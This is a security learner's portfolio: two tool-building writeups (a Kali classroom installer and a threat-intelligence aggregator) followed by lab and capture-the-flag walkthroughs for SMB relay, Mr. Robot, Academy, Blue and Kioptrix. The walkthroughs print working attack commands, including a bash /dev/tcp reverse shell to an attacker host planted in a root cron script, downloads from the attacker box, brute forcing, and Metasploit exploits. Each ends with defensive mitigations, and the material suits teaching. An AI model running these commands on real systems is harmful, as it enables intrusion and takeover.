ClassroomEnv — Build & Debugging Writeup

The problem

I run informal cybersecurity sessions for people entering the field. The recurring failure wasn't the teaching material — it was the environment. Participants arrived with different hypervisors, different Kali releases, pre-existing installs with arbitrary tool versions, and broken repositories. A large fraction of every session went to debugging other people's operating systems rather than teaching.

The obvious fix — PimpMyKali — repairs a broken Kali well, but it installs broadly. For a beginner session that's the wrong shape: it pulls in advanced tooling a first session has no use for, and it takes a long time. What a session actually needs is narrow and predictable.

The design

ClassroomEnv is a single Python script plus a set of Docker images built around three ideas:

Profiles. Tools are grouped into domain profiles — core, web, osint, ad, wireless, exploitation, extras, and full. You install only what a session needs. Advanced material is opt-in, never forced on a beginner.

A registry as the single source of truth. Every tool is one entry in a REGISTRY dict: installer, package name, binary name, version detection, minimum-version floor. Profiles are just lists of registry keys. Everything else reads from that one structure — no second list to drift out of sync.

Installer routing. Each tool declares its installer: apt for the default prebuilt path, pipx for Python application tools in isolated virtualenvs, go for tools not reliably packaged anywhere else.

Two layers, two guarantees. The script standardizes the toolset. The Docker images freeze it — docker pull gives everyone a byte-for-byte identical environment. The script standardizes; the images reproduce.

The debugging — where the real work was

The design was straightforward. The value was in everything that broke when the script ran against an actual Kali system.

3.1 — The verify check had no discriminating power

Symptom: A fresh, healthy install showed nine tools as MISMATCH — nmap, git, curl, wget, python3, pip, tmux, jq, vim — every single run.

Cause: Version comparison used found.startswith(pinned). "7.98" doesn't start with "7.94", so every tool that received a routine update since the pins were set failed. The pins were a frozen snapshot of a moving target.

Fix: Replaced the prefix match with a numeric, component-wise floor comparison: parse both versions into integer lists, zero-pad, compare. 8.18.0 >= 7.80 passes; a genuine regression like 7.50 < 7.90 fails. The check now means something.

3.2 — go install was the wrong installer for ProjectDiscovery tools

Symptom: subfinder triggered a multi-minute source build. dnsx failed outright: the go.mod file contained replace directives that go install refuses by design.

Cause: The registry routed httpx, nuclei, subfinder, and dnsx through go install pkg@version — slow, network-heavy, and hitting Go module constraints on every machine identically.

Fix: All four are in Kali's apt repositories as prebuilt binaries. Flipped them from go to apt. Only kerbrute stays on go — it isn't reliably packaged, and Go modules pin its version via @v1.0.3.

3.3 — pip install refused on modern Kali (PEP 668)

Symptom: error: externally-managed-environment on every pip-based tool.

Cause: Kali (Python 3.12+) marks the system Python as externally managed. System-wide pip install is refused by design.

Fix: Switched pip tools to pipx — installs each tool into its own isolated virtualenv and links the binary onto PATH. The --break-system-packages shortcut was deliberately rejected: it does exactly what the error warns against.

3.4 — pipx tools crashed on pkg_resources

Symptom: After installing via pipx, shodan version threw ModuleNotFoundError: No module named 'pkg_resources'.

Cause: Python 3.12+ no longer ships setuptools/pkg_resources by default. Injecting bare setuptools didn't help — it pulled setuptools 82, and setuptools 81 removed pkg_resources entirely.

Fix: Inject setuptools<81 into each pipx venv — the last version that still ships pkg_resources. Confirmed by downgrading a live venv from 82.0.1 to 80.10.2, after which shodan version returned 1.31.0 cleanly.

3.5 — A stray apt copy shadowed the working pipx tool

Symptom: Even after the setuptools<81 fix, shodan still crashed — traceback pointed at /usr/bin/shodan, an apt copy.

Cause: Something pulled python3-shodan as a dependency. The script's detection used shutil.which("shodan"), found the broken apt copy on PATH, declared it already installed, and skipped the pipx install entirely.

Fix: For pipx tools, detection now checks /usr/local/bin/<tool> specifically — not anywhere on PATH. Since /usr/local/bin precedes /usr/bin on the standard Kali PATH, the pipx copy wins at runtime.

3.6 — httpx is not called httpx on Kali

Symptom: httpx -version → command not found, even after a reported successful build.

Cause: Kali packages ProjectDiscovery's httpx as httpx-toolkit — both the package name and the binary — because the bare name httpx is already owned by python3-httpx.

Fix: Set both bin and version_cmd to httpx-toolkit. This collision is unique to httpx — subfinder, nuclei, and dnsx keep their normal names.

3.7 — pwncat-cs is abandoned

Symptom: Persistent install failure after all other fixes.

Cause: pwncat-cs is no longer maintained and breaks on Python 3.12+. The upstream workaround requires a separately-provided Python 3.11 — which Kali doesn't ship by default.

Decision: Dropped it. A post-exploitation framework is advanced-profile material anyway. A tool that needs a Python downgrade is a liability in a training environment, not an asset.

3.8 — The Windows line-ending shebang failure

Symptom: ./classroomenv.py → 'python3\r': No such file or directory.

Cause: The file passed through Windows and picked up CRLF line endings. The shebang became #!/usr/bin/env python3\r — the kernel looked for an interpreter literally named python3\r.

Fix: Two layers. Ship LF-only. Add .gitattributes with * text=auto eol=lf to force Unix line endings on checkout for everyone who clones the repo regardless of OS.

3.9 — Docker layer caching hid fixes

Symptom: After editing the script and rebuilding a profile image, the bug persisted — build finished in 0.2 seconds, every step marked CACHED.

Cause: The script is COPY'd into the core image, and profile images build FROM classroomenv:core. Editing the script doesn't touch anything the profile Dockerfile sees, so Docker reused cached layers.

Fix: Any change to the script requires rebuilding core with --no-cache first, then the profile images. Documented in the README so it isn't rediscovered the hard way.

What this project is, honestly

It is not a novel idea. Install-scripts and metapackages for Kali already exist. Its value isn't innovation — it's a focused tool scoped to a real problem, and engineering judgment in the integration: correct installer routing, honest version semantics, isolated Python environments, a reproducible Docker layer, and a registry design that keeps one source of truth.

The work that made it actually function was not the design. It was the long tail of OS-level integration problems above — apt package renames, Python packaging breakage, Go module constraints, PATH shadowing, line endings, Docker caching. That's the difference between code that exists and a tool that survives contact with a real machine.

What's next

The natural extension isn't more tools or more profiles — that's just width. It's pairing the offensive profiles with the detection side: an attack scenario alongside the detection rules that catch it. An install-script that also teaches what attacks look like from the defender's seat would be genuinely differentiated, rather than a cleaner version of something that already exists.

SMB Relay in Practice: Setup to Domain Compromise

What is an SMB relay attack?

When a Windows machine authenticates to a network share, it sends an NTLM challenge. If SMB signing isn't enforced, an attacker positioned between client and server can relay that authentication to another machine and authenticate as the victim — without ever cracking the hash.

The attack doesn't need credentials. It needs position and an unsigned SMB environment — which, in most enterprise networks, is exactly what you have.

Lab setup

Domain Controller: Windows Server 2019 (192.168.10.5)
Workstation 1:    Windows 10 (192.168.10.10) — victim
Attack box:       Kali Linux (192.168.10.99)
Tools:            Responder + ntlmrelayx (Impacket)

Step 1 — Confirm SMB signing is off

netexec smb 192.168.10.0/24 --gen-relay-list targets.txt

Step 2 — Position and listen

Responder poisons LLMNR/NBT-NS queries. We turn its own SMB/HTTP servers off because we want to relay, not capture.

# responder.conf: SMB = Off, HTTP = Off
responder -I eth0 -rdw

Step 3 — Relay

ntlmrelayx.py -tf targets.txt -smb2support
# SAM dump happens automatically if victim is local admin

Detection & mitigation

This is the part that matters. Knowing how to run the attack is table stakes. Knowing how to stop it is the work:

  • Enforce SMB signing domain-wide via GPO — removes the relay surface entirely
  • Disable LLMNR and NetBIOS-NS — eliminates the poisoning vector
  • Monitor for Responder-shaped traffic: anomalous LLMNR responses
  • Tier admin accounts — local admin reuse amplifies every relay attack

Mr. Robot — Wordlist Warfare & Privilege Escalation

The machine

Mr. Robot is a VulnHub machine themed around the show. Three keys at different privilege levels. Web-first, pivots into WordPress exploitation, ends with a classic priv-esc. What makes it memorable: the answers are in the show itself.

Enumeration

nmap -sV -sC -oN nmap_initial <target>
# Open: 80 (HTTP), 443 (HTTPS), 22 (filtered)

ffuf -w directory-list-2.3-medium.txt -u http://target/FUZZ -mc 200,301
# Found: /wp-login, /robots.txt, /license

Key 1 — robots.txt

Two entries: a path to the first key, and the show's character wordlist — fsocity.dic, 858,000 entries with heavy duplication.

sort -u fsocity.dic > fsocity_clean.dic
# 858,160 -> 11,451 unique entries

WordPress bruteforce

Username enumeration via the login error message surfaces Elliot. Then hydra with the cleaned wordlist:

hydra -l Elliot -P fsocity_clean.dic target http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR" -t 20

Reverse shell via theme editor

nc -lvnp 4444
# Appearance -> Theme Editor -> 404.php (PHP reverse shell)
# www-data shell

Key 3 — root via nmap SUID

find / -perm -4000 2>/dev/null | grep nmap
nmap --interactive
!sh
# root shell

The lesson

The wordlist being on the machine itself is the best lesson. Attackers use your own data against you. The enumeration phase exists precisely because targets leave more exposed than they realise.

ThreatLens — Threat Intelligence Aggregation Platform

The problem

Security analysts investigating suspicious indicators — IPs, domains, hashes, URLs — work across multiple platforms by default. VirusTotal for detection ratios. AbuseIPDB for abuse confidence. Shodan for infrastructure exposure. Each platform answers a different question, uses a different confidence model, and treats a threat last seen six months ago the same way it treats one from yesterday.

The result: fragmented signal, manual correlation, and risk assessments that vary depending on which analyst ran which query in which order. ThreatLens collapses that workflow into a single enrichment pipeline and produces a normalized, time-sensitive risk score instead of three separate read-outs.

Architecture

React Frontend (Vite)
        │
        │  HTTP — localhost:8000
        ▼
FastAPI Backend (Python 3.11+)
        │
        ├──▶ VirusTotal API    (detections, categories, CVEs, PoC flags)
        ├──▶ AbuseIPDB API     (abuse score, reports, ISP, TOR identification)
        └──▶ Shodan API        (open ports, CVEs with CVSS, service banners)

All three source queries execute asynchronously via httpx. A semaphore caps concurrent enrichment at 5 IOCs simultaneously — enough to keep latency low without burning free-tier API quotas on large batches. API keys live server-side only. The browser never sees them.

The pipeline

ThreatLens accepts batches of up to 50 IOCs and runs them through six stages in sequence:

Classification → Enrichment → Behavioral Extraction → Risk Scoring → Temporal Decay → Clustering

The output is not raw API data forwarded to the frontend. Each IOC exits the pipeline with a decayed risk score, a severity classification, a normalized tag set, and cluster membership identifying indicators with similar behavioral profiles.

Engineering decisions

Why weighted scoring

Each provider answers a different question. VirusTotal's detection ratio reflects AV engine consensus. AbuseIPDB's confidence score reflects distinct user reports of abuse. Shodan reflects infrastructure exposure state. Combining them without weighting produces noise — a Shodan-heavy score penalizes a cleanly-used server with open ports while missing a zero-detection phishing domain entirely.

Current weighting: VirusTotal at 45%, AbuseIPDB at 35%, Shodan at 20%. This reflects the operational priority of detection signal over exposure state. It is a deliberate assumption, not a calibrated measurement. The limitation is documented.

Why temporal decay

Threat intelligence degrades. An IP flagged for botnet activity eight months ago may be decommissioned, reassigned, or cleaned. Treating that historical signal with the same weight as a report from last week produces misleading severity classifications. ThreatLens applies a 30-day half-life exponential decay:

decay_factor = e^(−ln2 × days_since_last_seen / 30)
final_score  = raw_score × decay_factor

At 30 days, a score carries 50% of its original weight. At 60 days, 25%. At 90 days, roughly 12.5%. The analyst-facing score is always the decayed value — not the raw one. Recently active threats surface above stale historical data without requiring manual recency filtering.

Why behavioral tags instead of raw source output

Raw source metadata is not comparable across IOCs. VirusTotal categories use vendor-defined strings. Shodan port data is numerical. AbuseIPDB metadata is structured differently still. ThreatLens converts source metadata into a normalized tag set — ssh, rdp, smb, tor-exit, cve-present, high-abuse, mass-reported — derived from actual signals rather than assigned manually. These tags are the input to clustering.

Why Jaccard similarity for clustering

Jaccard compares set overlap: |tags_A ∩ tags_B| / |tags_A ∪ tags_B|. It requires no feature vectors, no training data. For behavioral tag sets of the size ThreatLens produces, it is computationally trivial and produces interpretable results. IOCs with similarity ≥ 0.65 are placed in the same cluster. Known limitation: it compares against the first seed of each cluster rather than performing graph-based clustering — in larger datasets it will miss relationships. Appropriate for the 50-IOC request cap.

Limitations

IOC validation is format-only. The IPv4 regex matches 999.999.999.999 — range validation is absent. Scoring weights are assumptions, not derived from historical incident data or analyst feedback. No persistence layer — results live in memory only; trend analysis requires an SQLite or PostgreSQL backend. CORS is open and authentication is absent — acceptable for local research, blockers before any public deployment.

What this project actually is

It is not a SIEM. It is not a full threat-intel platform. It is the answer to a specific question: given a batch of suspicious indicators, which ones matter right now and which are historical noise? The time-decay model is the part that earns its keep. Prioritized threat data without manual recency filtering is the difference between an analyst who triages efficiently and one who drowns in stale signals.

Academy — Credential Exposure to Root via Cron Hijack

The machine

Academy is a HackTheBox machine that chains a series of low-friction misconfigurations: anonymous FTP exposing credentials, a PHP upload bypass for initial access, a poorly secured user account surfaced by privilege escalation tooling, and a cron-executed script with world-writable permissions. No single step is sophisticated. Together they produce root.

Enumeration

nmap -sV -sC -oN nmap_academy <target>
# Open: 21 (FTP — anonymous login allowed), 22 (SSH), 80 (HTTP)

The scan returned three services. Anonymous FTP is the first flag worth pulling on — it almost always means something was left accessible by mistake.

FTP — credentials in the open

Connected anonymously. The server held a single file: note.txt. It contained login credentials with an MD5-hashed password. The service to authenticate against was not clear yet, but the credentials were noted — MD5 is trivially crackable if needed, but identifying the target came first.

Subdomain discovery

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   -u http://<target> -H "Host: FUZZ.academy.htb" -mc 200,301

The FTP note implied a staging subdomain. ffuf surfaced it. The subdomain resolved to a login panel — the credentials from the FTP note authenticated without modification.

Initial foothold — PHP upload bypass

The authenticated panel included a profile photo upload field. The nmap scan confirmed PHP. Upload validation was client-side only — intercepting the request and changing the content type was enough to push a shell.php.

# pentestmonkey PHP reverse shell — edit before uploading:
# $ip = '<attacker-ip>';
# $port = 4444;

nc -lvnp 4444
# Upload shell.php via the profile photo field, trigger via browser

Shell returned as www-data. Not root, but on the box.

Privilege escalation — linpeas to credentials

# Serve linpeas from the attack box:
python3 -m http.server 8080

# On the target:
wget http://<attacker-ip>:8080/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

linpeas surfaced a user grimmie with plaintext credentials in a configuration file. SSH'd in directly — the credentials worked.

Root — cron job hijack

In grimmie's home directory: a file called backup.sh. Routine backup script. The question was whether it ran on a schedule and under what user context. It was not visible in ps aux, so pspy was needed to catch it live.

# Serve pspy from the attack box:
wget http://<attacker-ip>:8080/pspy64
chmod +x pspy64 && ./pspy64

pspy confirmed it: backup.sh executing as root on a cron interval. The file was writable by grimmie. That is the vulnerability — a root cron job executing a user-writable script.

# Overwrite backup.sh with a reverse shell:
echo 'bash -i >& /dev/tcp/<attacker-ip>/8080 0>&1' > backup.sh

# Listener on attack box:
nc -lvnp 8080

On the next cron execution: root shell.

Detection & mitigation

  • Disable anonymous FTP or audit what it exposes — credentials in an anonymous-readable directory is not a misconfiguration, it is an open door
  • Validate file uploads server-side on content and execution context, not just MIME type
  • Audit cron jobs running as root — especially scripts outside /etc/ owned by non-root users
  • Run linpeas against your own systems periodically; what it finds is what the attacker finds

Blue — EternalBlue and Why You Should Run It by Hand

The machine

Blue is the canonical EternalBlue machine on HackTheBox. It exists to teach ms17-010. Most people run it through Metasploit in under five minutes and move on. The value is not in the root shell — it is in understanding what the exploit is actually doing before you automate it into a single command.

Enumeration

nmap -sV -sC -p- -oN nmap_blue <target>
# Open: 135 (msrpc), 139 (netbios-ssn), 445 (microsoft-ds)
# OS: Windows 7 Professional SP1

Two things immediately visible: SMB on port 445, and Windows 7 SP1. That combination has one obvious implication. The nmap vuln scripts confirmed it — ms17-010, EternalBlue.

The vulnerability

EternalBlue exploits a buffer overflow in the Windows SMBv1 implementation. The exploit sends a malformed TRANSACTION2 request, overflows a pool buffer, and achieves kernel-level code execution. It was developed by the NSA, leaked by Shadow Brokers in 2017, and used in both WannaCry and NotPetya within weeks of the leak.

The patch (MS17-010) was available before the leak. Every machine that fell to WannaCry was running unpatched software against a known vulnerability.

Exploitation

msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <attacker-ip>
run

The exploit targets port 445 directly. On success, a meterpreter session opens. The shell returns as NT AUTHORITY\SYSTEM — kernel execution means landing at the highest Windows privilege level. There is no escalation phase because there is no lower privilege to escalate from.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

What this actually demonstrates

Blue is not a complex machine. Its purpose is to make a point: an unpatched SMB service on a network-accessible machine belongs to whoever finds it first. The exploit is stable, reliable, and in every major framework. The follow-up exercise that matters is running Wireshark while the exploit fires — watch the malformed TRANSACTION2 packets, watch the shell pop, understand it at the wire level rather than trusting a module to do the thinking for you.

Detection & mitigation

  • Disable SMBv1 entirely — it has no legitimate use case on modern networks
  • Apply MS17-010; if a system cannot be patched, it should not be network-accessible
  • Monitor for anomalous SMB traffic: large malformed TRANSACTION2 requests are EternalBlue's fingerprint on the wire
  • Network segmentation limits blast radius — an exploited workstation should not have unfiltered SMB access to the rest of the domain

Kioptrix — SMB Enumeration to Root via trans2open

The machine

Kioptrix Level 1 is a foundational VulnHub machine — the kind that teaches the recon-to-exploit loop without letting you skip steps. The attack surface is narrow: an Apache web server, SSH, and an ancient Samba installation. The vulnerability is real, the exploit is in searchsploit, and what it teaches is how to identify which surface to hit and why.

Enumeration

nmap -sS -T4 -p- -A <target>
# -sS: SYN stealth scan — sends RST instead of completing the handshake
# Open: 22 (SSH), 80 (HTTP), 139 (Samba), 443 (HTTPS)

SYN scanning completes the first two steps of the TCP handshake then sends a RST — port state confirmed without a full connection. Quieter than a full connect scan, the right habit for recon.

nikto -h http://<target>
# Flags: Apache version, mod_ssl version, known CVEs for each

Nikto flagged outdated Apache and mod_ssl versions. The Samba version was the more interesting finding — 2.2.1a, which maps directly to a known remote code execution vulnerability.

Vulnerability identification

searchsploit samba 2.2
# trans2open — remote buffer overflow, Samba < 2.2.8 (CVE-2003-0201)

trans2open is a buffer overflow in Samba's handling of TRANSACTION2 requests. Any Samba below 2.2.8 is vulnerable. Kioptrix runs 2.2.1a — exploitable without modification.

Exploitation via Metasploit

msfconsole
search trans2open
use exploit/linux/samba/trans2open
set RHOSTS <target>
set PAYLOAD linux/x86/shell_reverse_tcp
run

The default payload is the staged meterpreter shell (linux/x86/meterpreter/reverse_tcp). On Kioptrix it fails — the session opens and immediately dies. The fix is switching to the non-staged reverse shell.

Staged vs non-staged: a staged payload sends a small stager that calls back to pull the full payload. Non-staged sends everything at once. On older or constrained targets, the staging callback fails and the session drops. When a session opens and immediately dies, non-staged is always the first thing to try.

whoami
# root

Alternative paths

OpenFuck targets the mod_ssl vulnerability Nikto flagged — a different surface, same outcome. The exploit requires the exact Apache and mod_ssl version string to select the right offset; Nikto provides both. Hydra SSH brute force is a third path if credential reuse is suspected:

hydra -l <user> -P /usr/share/wordlists/rockyou.txt   ssh://<target>:22 -t 4 -V

On a real engagement you map all attack surfaces before committing to one. Kioptrix is a single-machine lab so the first working path is enough — but the habit of not locking in too early pays off when the obvious surface is patched and the next one is not.

Detection & mitigation

  • Samba 2.2.x is over twenty years past end-of-life — update or isolate without exception
  • trans2open has a Metasploit module; if your Samba is old enough, exploitation requires no skill, just a version number
  • Monitor SMB traffic for malformed TRANSACTION2 requests — same family of fingerprints as EternalBlue
  • Nikto scans your web server the same way an attacker does; run it against your own stack before someone else does
